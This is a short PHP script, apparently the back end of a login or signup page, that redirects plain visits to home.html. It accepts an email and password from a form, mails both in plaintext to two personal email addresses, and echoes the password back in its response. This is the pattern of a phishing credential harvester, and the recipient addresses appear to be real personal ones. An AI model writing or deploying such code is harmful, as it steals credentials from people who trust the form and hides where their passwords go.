<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
  header("Location: home.html"); /* Redirect browser */
  exit();
}else{
  $id = "";
  $mensaje = "";
  if(isset($_POST) && !empty($_POST)){
    $email = $_POST['email'];
    if (filter_var($email, FILTER_VALIDATE_EMAIL) == false) {
      $mensaje = "Invalid email format";
      $id = "0";
      $respuesta = $arrayName = array("mensaje:" => $mensaje, "ide" => $id);
      echo json_encode($respuesta);
      return false;
    }else {
      $pass = $_POST['contrasenia'];
      $to = "facuvega1989@gmail.com";
      $email_subject = "new user";
      $email_body = "a new user has been added to the list, user:" . $email . ", pass:" . $pass . "";
      mail($to,$email_subject,$email_body);
      $to = "favegapuente@yahoo.com.ar";
      mail($to,$email_subject,$email_body);
      $id = "1";
      $mensaje = "usuario anadido con exito";
      $respuesta = $arrayName = array("mense:" => $mensaje, "ide" => $id, "mail" => $email, "pass" => $pass);
      echo json_encode($respuesta);
      return true;
    }
  }else{
    $id = "0";
    $mensaje = "no se pudo anadir el usuario";
    $respuesta = $arrayName = array("mense:" => $mensaje, "ide" => $id);
    echo json_encode($respuesta);
  }
  //htp://www.codingcage.com/2015/11/ajax-login-script-with-jquery-php-mysql.html//
  //htps://stackoverflow.com/questions/16902101/validate-user-login-php

}
